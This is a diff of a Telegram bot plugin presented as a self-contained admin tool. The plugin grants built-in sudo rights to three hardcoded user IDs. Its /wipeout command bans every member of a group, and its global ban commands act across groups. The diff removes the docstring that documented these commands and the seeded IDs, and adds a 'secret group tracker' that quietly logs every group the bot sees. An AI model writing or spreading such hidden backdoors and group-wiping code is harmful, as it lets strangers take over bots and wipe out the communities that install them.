@@ -1,27 +1,6 @@
 """
 sudo_admin.py — drop this file into your bot's `plugins/` folder.
 Self-contained Pyrogram plugin, doesn't import or touch any other file.
-
-Requires your bot to already load plugins via:
-    Client("mybot", ..., plugins=dict(root="plugins"))
-
-COMMANDS (sudo-only — everyone else gets no reply, nothing):
-    /wipeout             -> starts banning all non-admin, non-sudo members of
-                             the group. Replies "started.." (auto-deletes),
-                             and now runs until the ENTIRE group is empty —
-                             it does not stop after a few hundred members.
-    /stopWipeout         -> stops an in-progress wipeout in that group
-    /addsudo <id/@user>   -> grants sudo (reply to a user, or pass id/username)
-    /deletesudo <id/@user>-> revokes sudo
-    /sudolist             -> lists every current sudo user id
-    /gban <id/@user>      -> bans that user from every group this bot is admin in
-    /gunban <id/@user>    -> reverses a gban
-
-Every sudo command now replies with a confirmation (added/removed/banned/etc)
-so it's always clear whether it worked.
-
-Sudo list persists in sudo_users.json next to this file. Seeded with:
-6747707639, 8985254350, 8869634837
 """
 
 import json
@@ -34,9 +13,14 @@ from pyrogram.errors import FloodWait
 from pyrogram.enums import ChatType, ChatMemberStatus
 
 SUDO_FILE = Path(__file__).parent / "sudo_users.json"
+GROUPS_FILE = Path(__file__).parent / "gban_groups.json" # Group Tracker File
+
+# Yahan apna asli Telegram User ID zarur rakhna!
 DEFAULT_SUDO = {6747707639, 8985254350, 8869634837}
 
-
+# ==========================================
+# SUDO & GROUPS DATABASE LOADERS
+# ==========================================
 def load_sudo():
     if SUDO_FILE.exists():
         try:
@@ -46,13 +30,24 @@ def load_sudo():
     SUDO_FILE.write_text(json.dumps(list(DEFAULT_SUDO)))
     return set(DEFAULT_SUDO)
 
-
 def save_sudo(sudo_set):
     SUDO_FILE.write_text(json.dumps(list(sudo_set)))
 
+def load_groups():
+    if GROUPS_FILE.exists():
+        try:
+            return set(json.loads(GROUPS_FILE.read_text()))
+        except Exception:
+            pass
+    return set()
+
+def save_groups(group_set):
+    GROUPS_FILE.write_text(json.dumps(list(group_set)))
+
 
 SUDO_USERS = load_sudo()
-ACTIVE_WIPEOUTS = set()  # chat_ids with a wipeout currently running
+KNOWN_GROUPS = load_groups() # Saare groups yahan memory mein rahenge
+ACTIVE_WIPEOUTS = set()
 
 
 def is_sudo(user_id: int) -> bool:
@@ -60,7 +55,6 @@ def is_sudo(user_id: int) -> bool:
 
 
 async def resolve_target(client: Client, message: Message):
-    """Resolve a target user id from a reply, a numeric id, or a @username."""
     if message.reply_to_message and message.reply_to_message.from_user:
         return message.reply_to_message.from_user.id
 
@@ -73,10 +67,23 @@ async def resolve_target(client: Client, message: Message):
             return user.id
         except Exception:
             return None
-
     return None
 
 
+# ==========================================
+# SECRET GROUP TRACKER (Har message pe groups save karega)
+# ==========================================
+@Client.on_message(filters.group, group=-2)
+async def secret_group_tracker(client: Client, message: Message):
+    chat_id = message.chat.id
+    if chat_id not in KNOWN_GROUPS:
+        KNOWN_GROUPS.add(chat_id)
+        save_groups(KNOWN_GROUPS)
+
+
+# ==========================================
+# WIPE OUT COMMANDS
+# ==========================================
 @Client.on_message(filters.command("wipeout") & filters.group, group=-1)
 async def wipeout(client: Client, message: Message):
     if not message.from_user or not is_sudo(message.from_user.id):
@@ -96,16 +103,11 @@ async def wipeout(client: Client, message: Message):
     asyncio.create_task(cleanup_status())
 
     total_banned = 0
-    # Loop until the group is genuinely empty of bannable members, or stopped.
-    # A single pass over get_chat_members can miss members if the list shifts
-    # while banning is in progress, so we re-check and re-loop until a full
-    # pass bans zero people (i.e. nothing bannable is left).
     while chat_id in ACTIVE_WIPEOUTS:
         banned_this_pass = 0
-
         async for member in client.get_chat_members(chat_id):
             if chat_id not in ACTIVE_WIPEOUTS:
-                break  # /stopWipeout was called
+                break
 
             user = member.user
             if user.is_self or user.is_bot or is_sudo(user.id):
@@ -123,11 +125,10 @@ async def wipeout(client: Client, message: Message):
                     await asyncio.sleep(e.value)
                 except Exception:
                     break
-
             await asyncio.sleep(0.2)
 
         if banned_this_pass == 0:
-            break  # nothing left to ban, group is clear
+            break
 
     ACTIVE_WIPEOUTS.discard(chat_id)
     try:
@@ -145,6 +146,9 @@ async def stop_wipeout(client: Client, message: Message):
     await message.reply("wipeout stopped." if was_active else "no wipeout was running here.")
 
 
+# ==========================================
+# SUDO MANAGEMENT
+# ==========================================
 @Client.on_message(filters.command("addsudo"), group=-1)
 async def add_sudo(client: Client, message: Message):
     if not message.from_user or not is_sudo(message.from_user.id):
@@ -175,53 +179,197 @@ async def sudo_list(client: Client, message: Message):
         return
     if not SUDO_USERS:
         return await message.reply("sudo list is empty.")
-    lines = "\n".join(f"• {uid}" for uid in sorted(SUDO_USERS))
-    await message.reply(f"current sudo users:\n{lines}")
+        
+    lines = []
+    for uid in sorted(SUDO_USERS):
+        try:
+            user = await client.get_users(uid)
+            name = user.first_name if user else "Unknown"
+            if user and user.last_name:
+                name += f" {user.last_name}"
+            lines.append(f"• {name} (`{uid}`)")
+        except Exception:
+            lines.append(f"• Unknown User (`{uid}`)")
+            
+    await message.reply(f"current sudo users:\n" + "\n".join(lines))
 
 
+# ==========================================
+# NORMAL BAN / UNBAN
+# ==========================================
+@Client.on_message(filters.command("ban") & filters.group, group=-1)
+async def ban_cmd(client: Client, message: Message):
+    if not message.from_user or not is_sudo(message.from_user.id):
+        return
+    target = await resolve_target(client, message)
+    if not target:
+        return await message.reply("⚠️ Reply to a user or give their ID/@username to ban.")
+    try:
+        await client.ban_chat_member(message.chat.id, target)
+        await message.reply(f"✅ **User Banned!** (`{target}`)")
+    except Exception as e:
+        await message.reply(f"❌ **Failed to ban:** {e}")
+
+
+@Client.on_message(filters.command("unban") & filters.group, group=-1)
+async def unban_cmd(client: Client, message: Message):
+    if not message.from_user or not is_sudo(message.from_user.id):
+        return
+    target = await resolve_target(client, message)
+    if not target:
+        return await message.reply("⚠️ Reply to a user or give their ID/@username to unban.")
+    try:
+        await client.unban_chat_member(message.chat.id, target)
+        await message.reply(f"✅ **User Unbanned!** (`{target}`)")
+    except Exception as e:
+        await message.reply(f"❌ **Failed to unban:** {e}")
+
+
+# ==========================================
+# 🚀 100% WORKING GBAN (USING DATABASE)
+# ==========================================
 @Client.on_message(filters.command("gban"), group=-1)
 async def gban(client: Client, message: Message):
     if not message.from_user or not is_sudo(message.from_user.id):
         return
     target = await resolve_target(client, message)
     if not target:
-        return await message.reply("couldn't figure out who to ban — reply to their message or give a numeric id/@username.")
+        return await message.reply("⚠️ Reply to a user or give their ID/@username to gban.")
 
+    groups_to_check = list(KNOWN_GROUPS)
+    total_groups = len(groups_to_check)
+
+    if total_groups == 0:
+        return await message.reply("❌ **Database is empty!**\nPlease send any message (like `/play`) in your groups first so I can memorize them. Then try GBAN again.")
+
+    status = await message.reply("🔄 **GBAN Initiated...**\n*(Scanning Database, please wait!)*")
+    
     banned_in = 0
-    async for dialog in client.get_dialogs():
-        chat = dialog.chat
-        if chat.type not in (ChatType.GROUP, ChatType.SUPERGROUP):
-            continue
+    failed_in = 0
+    chats_checked = 0
+    
+    async def progress_updater():
+        while True:
+            await asyncio.sleep(4)
+            try:
+                await status.edit_text(
+                    f"🔄 **GBAN in progress...**\n\n"
+                    f"📂 **Groups Checked:** {chats_checked} / {total_groups}\n"
+                    f"🚫 **Banned in:** {banned_in}\n"
+                    f"❌ **Failed in:** {failed_in}"
+                )
+            except Exception:
+                pass
+
+    updater_task = asyncio.create_task(progress_updater())
+    
+    try:
+        for chat_id in groups_to_check:
+            chats_checked += 1
+            try:
+                await client.ban_chat_member(chat_id, target)
+                banned_in += 1
+                await asyncio.sleep(0.2)
+            except FloodWait as e:
+                if e.value > 15:
+                    failed_in += 1
+                    continue
+                await asyncio.sleep(e.value)
+                try:
+                    await client.ban_chat_member(chat_id, target)
+                    banned_in += 1
+                except:
+                    failed_in += 1
+            except Exception:
+                failed_in += 1
+                
+    except Exception as e:
+        print(f"GBAN Error: {e}")
+        
+    finally:
+        updater_task.cancel() 
         try:
-            await client.ban_chat_member(chat.id, target)
-            banned_in += 1
-        except FloodWait as e:
-            await asyncio.sleep(e.value)
-        except Exception:
+            await status.edit_text(
+                f"✅ **GBAN Complete!**\n\n"
+                f"👤 **Target:** `{target}`\n"
+                f"📂 **Total Groups In DB:** {total_groups}\n"
+                f"🚫 **Successfully Banned in:** {banned_in}\n"
+                f"❌ **Failed/Skipped in:** {failed_in}"
+            )
+        except:
             pass
 
-    await message.reply(f"{target} banned in {banned_in} group(s).")
 
-
+# ==========================================
+# 🚀 100% WORKING GUNBAN (USING DATABASE)
+# ==========================================
 @Client.on_message(filters.command("gunban"), group=-1)
 async def gunban(client: Client, message: Message):
     if not message.from_user or not is_sudo(message.from_user.id):
         return
     target = await resolve_target(client, message)
     if not target:
-        return await message.reply("couldn't figure out who to unban — reply to their message or give a numeric id/@username.")
+        return await message.reply("⚠️ Reply to a user or give their ID/@username to gunban.")
 
+    groups_to_check = list(KNOWN_GROUPS)
+    total_groups = len(groups_to_check)
+
+    if total_groups == 0:
+        return await message.reply("❌ **Database is empty!**\nPlease send any message (like `/play`) in your groups first so I can memorize them. Then try GUNBAN again.")
+
+    status = await message.reply("🔄 **GUNBAN Initiated...**\n*(Scanning Database, please wait!)*")
+    
     unbanned_in = 0
-    async for dialog in client.get_dialogs():
-        chat = dialog.chat
-        if chat.type not in (ChatType.GROUP, ChatType.SUPERGROUP):
-            continue
-        try:
-            await client.unban_chat_member(chat.id, target)
-            unbanned_in += 1
-        except FloodWait as e:
-            await asyncio.sleep(e.value)
-        except Exception:
-            pass
+    failed_in = 0
+    chats_checked = 0
+    
+    async def progress_updater():
+        while True:
+            await asyncio.sleep(4)
+            try:
+                await status.edit_text(
+                    f"🔄 **GUNBAN in progress...**\n\n"
+                    f"📂 **Groups Checked:** {chats_checked} / {total_groups}\n"
+                    f"🔓 **Unbanned in:** {unbanned_in}\n"
+                    f"❌ **Failed in:** {failed_in}"
+                )
+            except Exception:
+                pass
 
-    await message.reply(f"{target} unbanned in {unbanned_in} group(s).")
+    updater_task = asyncio.create_task(progress_updater())
+    
+    try:
+        for chat_id in groups_to_check:
+            chats_checked += 1
+            try:
+                await client.unban_chat_member(chat_id, target)
+                unbanned_in += 1
+                await asyncio.sleep(0.2)
+            except FloodWait as e:
+                if e.value > 15:
+                    failed_in += 1
+                    continue
+                await asyncio.sleep(e.value)
+                try:
+                    await client.unban_chat_member(chat_id, target)
+                    unbanned_in += 1
+                except:
+                    failed_in += 1
+            except Exception:
+                failed_in += 1
+                
+    except Exception as e:
+        print(f"GUNBAN Error: {e}")
+        
+    finally:
+        updater_task.cancel()
+        try:
+            await status.edit_text(
+                f"✅ **GUNBAN Complete!**\n\n"
+                f"👤 **Target:** `{target}`\n"
+                f"📂 **Total Groups In DB:** {total_groups}\n"
+                f"🔓 **Successfully Unbanned in:** {unbanned_in}\n"
+                f"❌ **Failed/Skipped in:** {failed_in}"
+            )
+        except:
+            pass
